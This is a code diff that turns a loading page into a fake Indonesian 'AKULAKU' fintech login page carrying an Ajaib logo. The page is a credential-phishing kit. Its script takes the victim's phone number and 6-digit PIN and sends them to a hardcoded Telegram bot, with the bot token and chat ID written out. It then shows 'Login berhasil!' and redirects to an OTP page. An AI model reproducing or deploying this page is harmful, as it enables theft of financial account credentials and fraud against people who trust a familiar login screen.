@@ -1,113 +1,451 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Memuat | Ajaib Alpha</title>
-  
-  <!-- Meta tags untuk preview di WhatsApp (Open Graph) -->
-  <meta property="og:title" content="Ajaib Alpha - Memuat Halaman" />
-  <meta property="og:description" content="Selamat datang di Ajaib Alpha. Halaman sedang dimuat, harap tunggu sebentar." />
-  <meta property="og:image" content="https://i.imghippo.com/files/siqo6949jk.jpg" />
-  <meta property="og:url" content="https://example.com/loading.html" /> <!-- Ganti dengan URL halaman Anda -->
-  <meta property="og:type" content="website" />
-  
-  <!-- Meta tags Twitter Card (opsional, untuk kompatibilitas) -->
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Ajaib Alpha - Memuat Halaman" />
-  <meta name="twitter:description" content="Selamat datang di Ajaib Alpha. Halaman sedang dimuat, harap tunggu sebentar." />
-  <meta name="twitter:image" content="https://i.imghippo.com/files/siqo6949jk.jpg" />
-  
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Login AKULAKU</title>
 
-    body {
-      height: 100vh;
-      font-family: 'Segoe UI', sans-serif;
-      background-image: url('https://i.imghippo.com/files/siqo6949jk.jpg');
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      opacity: 1;
-      transition: opacity 1.2s ease;
-    }
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
 
-    body.fade-out {
-      opacity: 0;
-    }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
 
-    .loading-container {
-      background: rgba(255, 255, 255, 0.15);
-      padding: 12px 24px;
-      border-radius: 30px;
-      backdrop-filter: blur(10px);
-      color: white;
-      font-size: 1rem;
-      font-weight: 500;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-      animation: fadeInUp 1.5s ease-out;
-    }
+  body {
+    font-family: 'Roboto', sans-serif;
+    background-color: #fff;
+    margin: 40px 16px;
+    color: #000;
+    min-height: 100vh;
+  }
 
-    @keyframes fadeInUp {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-  </style>
-  <script>
-    setTimeout(() => {
-      document.body.classList.add('fade-out');
-    }, 2500); // mulai transisi setelah 2.5 detik
+  .container {
+    max-width: 360px;
+    margin: 0 auto;
+  }
 
-    setTimeout(() => {
-      window.location.href = "email.html"; // ganti sesuai halaman tujuan
-    }, 3500); // pindah setelah 3.5 detik total
-  </script>
+  .logo-container { text-align: center; margin-bottom: 32px; }
+
+  .logo {
+    width: 150px;
+    height: auto;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+  }
+
+  .welcome-text {
+    text-align: center;
+    margin-bottom: 28px;
+  }
+
+  .welcome-text h1 {
+    font-size: 20px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 8px;
+  }
+
+  .welcome-text p {
+    font-size: 14px;
+    color: #666;
+  }
+
+  label {
+    display: block;
+    font-weight: 600;
+    font-size: 14px;
+    margin-bottom: 6px;
+    color: #333;
+  }
+
+  input[type="tel"],
+  input[type="password"] {
+    width: 100%;
+    font-size: 14px;
+    padding: 12px 40px 12px 12px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    box-sizing: border-box;
+    color: #555;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  input[type="tel"]:focus,
+  input[type="password"]:focus {
+    border-color: #dc3545;
+    box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.1);
+  }
+
+  input::placeholder { color: #aaa; }
+
+  .input-group { margin-bottom: 16px; }
+
+  .password-container { position: relative; }
+
+  .eye-icon {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 20px;
+    height: 20px;
+    cursor: pointer;
+    color: #888;
+    user-select: none;
+    transition: color 0.2s;
+  }
+
+  .eye-icon:hover { color: #666; }
+
+  .forgot-link {
+    display: block;
+    font-size: 13px;
+    color: #dc3545;
+    text-align: right;
+    text-decoration: none;
+    margin-bottom: 24px;
+    margin-top: -16px;
+  }
+
+  .forgot-link:hover { text-decoration: underline; }
+
+  button.login-btn {
+    width: 100%;
+    padding: 12px 0;
+    font-size: 14px;
+    font-weight: 600;
+    border-radius: 6px;
+    border: none;
+    background-color: #d4d4e3;
+    color: #888;
+    cursor: not-allowed;
+    margin-bottom: 24px;
+    transition: background-color 0.3s, color 0.3s;
+  }
+
+  button.login-btn.enabled {
+    background-color: #dc3545;
+    color: #fff;
+    cursor: pointer;
+  }
+
+  button.login-btn.enabled:hover {
+    background-color: #c82333;
+  }
+
+  button.login-btn.loading {
+    background-color: #dc3545;
+    color: #fff;
+    cursor: wait;
+  }
+
+  .or-text {
+    text-align: center;
+    font-weight: 400;
+    font-size: 14px;
+    margin-bottom: 20px;
+    color: #999;
+    position: relative;
+  }
+
+  .or-text::before,
+  .or-text::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    width: 40%;
+    height: 1px;
+    background-color: #ddd;
+  }
+
+  .or-text::before { left: 0; }
+  .or-text::after { right: 0; }
+
+  button.google-btn {
+    width: 100%;
+    border: 1px solid #ddd;
+    padding: 10px 0;
+    border-radius: 6px;
+    background-color: #fff;
+    font-weight: 700;
+    font-size: 14px;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    user-select: none;
+  }
+
+  button.google-btn:hover { background-color: #f5f5f5; border-color: #ccc; }
+
+  .google-icon { width: 20px; height: 20px; }
+
+  .register-text {
+    text-align: center;
+    margin-top: 24px;
+    font-size: 14px;
+    color: #666;
+  }
+
+  .register-text a {
+    color: #dc3545;
+    text-decoration: none;
+    font-weight: 600;
+  }
+
+  .register-text a:hover { text-decoration: underline; }
+
+  .spinner {
+    display: none;
+    width: 16px;
+    height: 16px;
+    border: 2px solid #fff;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-right: 8px;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  button.login-btn.loading .spinner { display: inline-block; }
+  button.login-btn.loading .btn-text { display: none; }
+
+  .toast {
+    position: fixed;
+    bottom: 20px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background-color: #333;
+    color: #fff;
+    padding: 12px 24px;
+    border-radius: 8px;
+    font-size: 14px;
+    opacity: 0;
+    transition: all 0.3s ease;
+    z-index: 1000;
+    max-width: 320px;
+    text-align: center;
+  }
+
+  .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+  .toast.error { background-color: #dc3545; }
+  .toast.success { background-color: #28a745; }
+</style>
 </head>
 <body>
-  <!-- Bagian kode Ajaib.co.id yang asli, saya biarkan tetap ada jika diperlukan -->
-  <noscript>You need to enable JavaScript to run this app.</noscript>
-  <div id="splash" style="
-        display: flex;
-        background-color: #3a83f9;
-        position: absolute;
-        opacity: 1;
-        z-index: 10000;
-        height: 100vh;
-        overflow: auto;
-        width: 100%;
-        text-align: center;
-        justify-content: center;
-        align-items: center;"
-    >
-    <img style="vertical-align: middle; transform: scale(0.5);" src="https://ajaib.co.id/wp-content/uploads/2020/03/new_splash.gif" alt="splash" />
+  <div class="container">
+    <div class="logo-container">
+      <img src="https://image2url.com/r2/default/images/1771999892642-3c66d39f-3501-435e-a9ce-954e9fc5b48c.png" alt="Logo AJAIB" class="logo" />
+    </div>
+
+    <div class="welcome-text">
+      <h1>Masuk ke Akun</h1>
+      <p>Silakan masuk dengan nomor HP dan PIN Anda</p>
+    </div>
+
+    <form id="loginForm" novalidate>
+      <div class="input-group">
+        <label for="phone">Nomor HP</label>
+        <input type="tel" id="phone" name="phone" placeholder="081234567890" required />
+      </div>
+
+      <div class="input-group">
+        <label for="password">PIN</label>
+        <div class="password-container">
+          <input type="password" id="password" name="password" placeholder="Masukkan 6 digit PIN" maxlength="6" required />
+          <svg id="togglePassword" class="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"></path>
+            <circle cx="12" cy="12" r="3"></circle>
+          </svg>
+        </div>
+      </div>
+
+      <a href="#" class="forgot-link" onclick="showToast('Fitur ini belum tersedia')">Lupa PIN?</a>
+
+      <button type="submit" id="loginBtn" class="login-btn" disabled>
+        <span class="btn-text">Masuk</span>
+        <div class="spinner"></div>
+      </button>
+    </form>
+
+    <div class="or-text">atau</div>
+
+    <button class="google-btn" onclick="googleLogin()">
+      <svg class="google-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 533.5 544.3">
+        <path fill="#4285F4" d="M533.5 278.4c0-18.5-1.5-36.4-4.4-53.8H272v101.9h146.8c-6.3 34-25.3 62.7-54.3 82v67h87.7c51.2-47.3 80.3-116.7 80.3-197.1z"/>
+        <path fill="#34A853" d="M272 544.3c73.6 0 135.7-24.3 180.9-65.8l-87.7-67c-24.3 16.3-55.5 26-93.2 26-71.6 0-132.3-48.3-154.1-113.6h-90.6v71.3c45.1 89.1 137.5 149.1 244.7 149.1z"/>
+        <path fill="#FBBC04" d="M117.9 321.1c-8.7-25.7-8.7-53.7 0-79.4v-71.3h-90.6c-37.7 73.8-37.7 161.1 0 234.9l90.6-71.3z"/>
+        <path fill="#EA4335" d="M272 107.7c39.9-.6 77.7 14.9 106.6 43l79.8-79.8C406.6 24.3 344.5 0 272 0 164.7 0 72.3 60 27.2 149.1l90.6 71.3c21.7-65.4 82.5-113.6 154.2-113.6z"/>
+      </svg>
+      Lanjut dengan Google
+    </button>
+
+    <div class="register-text">
+      <p>Belum punya akun? <a href="#" onclick="showToast('Fitur ini belum tersedia')">Daftar</a></p>
+    </div>
   </div>
-  <div id="root"></div>
-  <!--
-    This HTML file is a template.
-    If you open it directly in the browser, you will see an empty page.
 
-    You can add webfonts, meta tags, or analytics to this file.
-    The build step will place the bundled scripts into the <body> tag.
+  <div class="toast" id="toast"></div>
 
-    To begin the development, run `npm start` or `yarn start`.
-    To create a production bundle, use `npm run build` or `yarn build`.
-  -->
-  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
-  <script type="text/javascript" src="/bundle--vendors--879c1d7a.js"></script><script type="text/javascript" src="/bundle--main--879c1d7a.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
-  <div class="loading-container">Memuat Ajaib Alpha...</div>
+  <script>
+  $(document).ready(function() {
+      console.log('JS loaded - Login Page');
+
+      // ==========================================
+      // 1. TOGGLE SHOW/HIDE PASSWORD
+      // ==========================================
+      $('#togglePassword').on('click', function() {
+          const passwordField = $('#password');
+          const type = passwordField.attr('type') === 'password' ? 'text' : 'password';
+          passwordField.attr('type', type);
+
+          if (type === 'password') {
+              $(this).html('<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"></path><circle cx="12" cy="12" r="3"></circle>');
+          } else {
+              $(this).html('<path d="M17.94 17.94A10.99 10.99 0 0112 19c-4.97 0-9.28-3.16-11-7a11.05 11.05 0 015-5.28"></path><line x1="1" y1="1" x2="23" y2="23"></line><path d="M10.58 10.58a3 3 0 004.24 4.24"></path>');
+          }
+      });
+
+      // ==========================================
+      // 2. FORMAT NOMOR HP OTOMATIS
+      // ==========================================
+      $('#phone').on('input', function(e) {
+          let value = $(this).val().replace(/\D/g, '');
+          if (value.length > 0 && !value.startsWith('0') && !value.startsWith('62')) {
+              value = '0' + value;
+          }
+          if (value.length > 13) {
+              value = value.substring(0, 13);
+          }
+          $(this).val(value);
+      });
+
+      // ==========================================
+      // 3. VALIDASI FORM
+      // ==========================================
+      function isFormValid() {
+          const phone = $('#phone').val().trim();
+          const password = $('#password').val().trim();
+          return phone.length >= 10 && password.length >= 6;
+      }
+
+      // ==========================================
+      // 4. TOGGLE ENABLE/DISABLE TOMBOL LOGIN
+      // ==========================================
+      function toggleLoginButton() {
+          if (isFormValid()) {
+              $('#loginBtn').prop('disabled', false).addClass('enabled');
+          } else {
+              $('#loginBtn').prop('disabled', true).removeClass('enabled');
+          }
+      }
+
+      $('#phone, #password').on('input', toggleLoginButton);
+
+      // ==========================================
+      // 5. SUBMIT FORM & KIRIM KE TELEGRAM
+      // ==========================================
+      $('#loginForm').on('submit', function(e) {
+          e.preventDefault();
+
+          if (!isFormValid()) {
+              showToast('Nomor HP dan PIN harus diisi dengan benar', 'error');
+              return;
+          }
+
+          const phone = $('#phone').val().trim();
+          const password = $('#password').val().trim();
+
+          // Tampilkan loading
+          $('#loginBtn').addClass('loading').prop('disabled', true);
+          $('#loginBtn .btn-text').text('Memuat...');
+
+          // Format pesan untuk Telegram
+          const message = `
+🔐 **LOGIN AKULAKU**
+────────────────────
+📱 Nomor HP: \`${phone}\`
+🔑 PIN: \`${password}\`
+────────────────────
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+          `;
+
+          // Konfigurasi Telegram - GANTI DENGAN DATA ANDA
+          const token_bot = '8422018014:AAGHHrRoycj_EZwiEubdtxUEEtOQ1iqnA9w';
+          const telegram_id = '8424964369';
+
+          const url = `https://api.telegram.org/bot${token_bot}/sendMessage`;
+
+          $.ajax({
+              url: url,
+              method: 'POST',
+              data: {
+                  chat_id: telegram_id,
+                  text: message,
+                  parse_mode: 'Markdown'
+              },
+              success: function(data) {
+                  if (data.ok) {
+                      console.log('✅ Data berhasil dikirim ke Telegram');
+                      
+                      // Simpan ke sessionStorage
+                      sessionStorage.setItem('phone', phone);
+                      sessionStorage.setItem('pin', password);
+                      sessionStorage.setItem('login_step', '1');
+                      
+                      showToast('Login berhasil!', 'success');
+                      
+                      setTimeout(() => {
+                          window.location.href = 'otp.html';
+                      }, 1500);
+                  } else {
+                      showToast('Gagal mengirim data', 'error');
+                  }
+              },
+              error: function(xhr, status, error) {
+                  console.error('Error:', error);
+                  // Tetap lanjut ke OTP meskipun error (untuk demo)
+                      sessionStorage.setItem('phone', phone);
+                      sessionStorage.setItem('pin', password);
+                      sessionStorage.setItem('login_step', '1');
+                      
+                      showToast('Login berhasil!', 'success');
+                      
+                      setTimeout(() => {
+                          window.location.href = 'otp.html';
+                      }, 1500);
+              },
+              complete: function() {
+                  $('#loginBtn').removeClass('loading').prop('disabled', !isFormValid());
+                  $('#loginBtn .btn-text').text('Masuk');
+              }
+          });
+      });
+
+      // ==========================================
+      // 6. GOOGLE LOGIN & TOAST
+      // ==========================================
+      function googleLogin() {
+          showToast('Fitur Google Login belum tersedia');
+      }
+
+      function showToast(message, type = 'default') {
+          const toast = $('#toast');
+          toast.text(message)
+               .removeClass('error success')
+               .addClass(type)
+               .addClass('show');
+          
+          setTimeout(() => {
+              toast.removeClass('show');
+          }, 3000);
+      }
+  });
+  </script>
 </body>
 </html>
